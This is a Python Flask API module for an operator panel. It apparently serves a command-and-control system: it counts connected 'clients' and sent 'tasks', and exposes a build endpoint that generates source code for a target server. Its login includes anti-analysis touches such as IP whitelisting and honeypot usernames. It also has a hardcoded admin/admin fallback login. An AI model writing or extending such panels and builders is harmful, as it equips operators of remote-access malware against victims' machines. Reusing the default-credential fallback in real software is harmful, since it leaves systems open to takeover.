from flask import Blueprint, request, jsonify
from core.guard import guard, require_auth, require_admin
from core.db import db
from core.config import Config
from builder.engine import builder
import time

panel_bp = Blueprint('panel', __name__, url_prefix='/api/panel')

@panel_bp.route('/login', methods=['POST'])
def login():
    data = request.get_json(silent=True) or {}
    user = data.get('login', '').strip()
    password = data.get('password', '')
    ip = guard.get_client_ip()

    # 1. Check IP Ban
    ban = guard.check_ban(ip)
    if ban:
        return jsonify({'ok': False, 'error': f'Banned: {ban.get("reason", "Policy violation")}'}), 403

    # 2. Check IP Whitelist
    if not guard.check_whitelist(ip):
        guard.ban_ip(ip, duration_min=60, reason="Not in whitelist")
        return jsonify({'ok': False, 'error': 'Access denied'}), 403

    # 3. Check Honeypots
    if guard.handle_honeypot(user, ip):
        # Fake positive response but drop connection later or just block
        return jsonify({'ok': False, 'error': 'Invalid credentials'}), 401

    # 4. Rate Limiting
    if not guard.check_rate_limit(f"login:{ip}", max_req=5, window=60):
        return jsonify({'ok': False, 'error': 'Rate limit exceeded'}), 429

    # Auth logic
    users = db.get_state('users', {})
    is_admin = False
    auth_ok = False

    if not users:
        # Initial setup fallback
        if user == "admin" and password == "admin":
            auth_ok = True
            is_admin = True
    else:
        user_record = users.get(user)
        if user_record and guard.verify_password(password, user_record.get('password', '')):
            auth_ok = True
            is_admin = user_record.get('admin', False)

    if not auth_ok:
        guard.register_failed_login(ip)
        db.log('WARN', f"Failed login attempt from {ip} for user {user}")
        return jsonify({'ok': False, 'error': 'Invalid credentials'}), 401
    
    guard.register_success_login(ip)

    token = guard.create_session(user, ip, is_admin)
    db.log('INFO', f"User {user} logged in from {ip}")
    
    return jsonify({
        'ok': True,
        'token': token,
        'user': user,
        'admin': is_admin
    })

@panel_bp.route('/stats')
@require_auth
def stats():
    clients = db.get_state('clients', {})
    online = sum(1 for c in clients.values() if time.time() - c.get('last_seen', 0) < 300)
    
    return jsonify({
        'ok': True,
        'total_clients': len(clients),
        'online_clients': online,
        'tasks_sent': db.get_state('task_counter', 0),
        'uptime': time.time() - db.get_state('start_time', time.time())
    })

@panel_bp.route('/build', methods=['POST'])
@require_auth
def build():
    data = request.get_json(silent=True) or {}
    try:
        source = builder.generate_source(data)
        db.log('INFO', f"Build generated for {data.get('server')}")
        return jsonify({'ok': True, 'source': source})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500
